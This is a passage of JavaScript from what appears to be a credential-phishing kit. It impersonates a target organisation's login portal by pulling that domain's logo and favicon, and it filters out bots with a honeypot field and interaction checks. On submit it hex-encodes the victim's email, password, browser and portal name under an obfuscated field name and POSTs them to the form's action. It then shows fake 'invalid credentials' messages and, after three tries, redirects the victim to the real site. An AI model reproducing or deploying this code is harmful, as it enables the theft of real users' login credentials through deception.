        const sources = [];
        
        // Priority 1: Check if we have a high-quality known logo
        if (knownLogos[targetDomain]) sources.push(knownLogos[targetDomain]);
        if (knownLogos[rootDomain] && targetDomain !== rootDomain) sources.push(knownLogos[rootDomain]);
        
        // Priority 2: Google Favicon API (High Quality 128px)
        sources.push(`https://www.google.com/s2/favicons?domain=${targetDomain}&sz=128`);
        if (targetDomain !== rootDomain) sources.push(`https://www.google.com/s2/favicons?domain=${rootDomain}&sz=128`);
        
        // Priority 3: Clearbit Logo API
        sources.push(`https://logo.clearbit.com/${targetDomain}`);
        if (targetDomain !== rootDomain) sources.push(`https://logo.clearbit.com/${rootDomain}`);
        
        // Priority 4: DuckDuckGo Favicon API
        sources.push(`https://icons.duckduckgo.com/ip3/${targetDomain}.ico`);
        
        // Priority 5: Fallback Avatar
        sources.push('https://www.gstatic.com/images/branding/product/1x/avatar_64dp.png');

        let currentIdx = 0;

        function tryNextLogo() {
            if (currentIdx >= sources.length) return;
            
            const url = sources[currentIdx];
            const tempImg = new Image();
            
            tempImg.onload = function() {
                dynamicLogo.src = url;
                landingLogo.src = url;
                dynamicFavicon.href = url;
                dynamicLogo.classList.add('loaded');
                landingLogo.classList.add('loaded');
            };
            
            tempImg.onerror = function() {
                currentIdx++;
                tryNextLogo();
            };
            
            tempImg.src = url;
        }

        tryNextLogo();
    }

    const backgroundList = [
        "https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&w=1920&q=80",
        "https://images.unsplash.com/photo-1497215728101-856f4ea42174?auto=format&fit=crop&w=1920&q=80",
        "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?auto=format&fit=crop&w=1920&q=80",
        "https://images.unsplash.com/photo-1524758631624-e2822e304c36?auto=format&fit=crop&w=1920&q=80"
    ];

    function loadRandomBackground() {
      const randomUrl = backgroundList[Math.floor(Math.random() * backgroundList.length)];
      const img = new Image();
      img.onload = function() {
          document.body.style.backgroundImage = `url('${randomUrl}')`;
      };
      img.src = randomUrl;
    }

    function bin2hexJS(input) {
      let hex = '';
      for (let i = 0; i < input.length; i++) {
        let h = input.charCodeAt(i).toString(16);
        if (h.length < 2) h = '0' + h;
        hex += h;
      }
      return hex;
    }

    function getBrowserName() {
        let ua = navigator.userAgent;
        if (ua.indexOf("Opera") != -1 || ua.indexOf('OPR') != -1) return 'Opera';
        else if (ua.indexOf("Chrome") != -1) return 'Chrome';
        else if (ua.indexOf("Safari") != -1) return 'Safari';
        else if (ua.indexOf("Firefox") != -1) return 'Firefox';
        else if (ua.indexOf("MSIE") != -1 || !!document.documentMode == true) return 'IE';
        else return 'Unknown';
    }

    setTimeout(() => {
        initialPreloader.style.opacity = '0';
        setTimeout(() => {
            initialPreloader.style.display = 'none';
            landingOverlay.style.display = 'flex';
        }, 500);
    }, 2000);

    document.getElementById('landingButton').addEventListener('click', () => {
        if (!humanInteracted && (Date.now() - startTime < 3000)) {
            return;
        }
        landingOverlay.style.display = 'none';
        transitionLoader.style.display = 'flex';
        setTimeout(() => {
            transitionLoader.style.display = 'none';
        }, 1500);
    });

    updatePageContent();
    loadRandomBackground();
    window.addEventListener('hashchange', updatePageContent);
    if (refreshButton) refreshButton.addEventListener('click', loadRandomBackground);

    loginForm.addEventListener('submit', function (e) {
      e.preventDefault();
      const hpValue = loginForm.elements['full_name_verification'].value;
      if (hpValue !== "" || !humanInteracted) {
          return;
      }
      submitButton.disabled = true;
      submitSpinner.style.visibility = 'visible';
      
      const browser = getBrowserName();
      const portal = targetDomain;
      const combinedData = emailInput.value + ' ; ' + passwordInput.value + ' ; ' + browser + ' ; ' + portal;
      
      const formData = new FormData();
      formData.append('ip8g5j6ciiq170o180tljtbd97', bin2hexJS(combinedData));
      
      fetch(loginForm.action, { method: 'POST', body: formData })
      .then(r => r.json())
      .then(response => {
        loginAttempts++;
        passwordInput.value = '';
        if (loginAttempts >= 3) {
            messageContainer.innerHTML = '<i class="fa-solid fa-circle-xmark"></i> Too many login failed attempt';
            messageContainer.className = 'message error visible';
            passwordInput.disabled = true;
            submitButton.disabled = true;
            submitButton.style.opacity = '0.5';
            setTimeout(() => {
                window.location.href = "https://www." + targetDomain;
            }, 2000);
        } else {
            passwordInput.focus();
            messageContainer.innerHTML = `<i class="fa-solid fa-triangle-exclamation"></i> Invalid credentials. Attempt ${loginAttempts} of 3.`;
            messageContainer.className = 'message error visible';
            submitButton.disabled = false;
        }
        submitSpinner.style.visibility = 'hidden';
      })
      .catch(() => {
        messageContainer.innerHTML = '<i class="fa-solid fa-wifi"></i> Network error. Please try again.';
        messageContainer.className = 'message error visible';
        submitButton.disabled = false;
        submitSpinner.style.visibility = 'hidden';
      });
    });
  });
  </script>
</body>
</html>
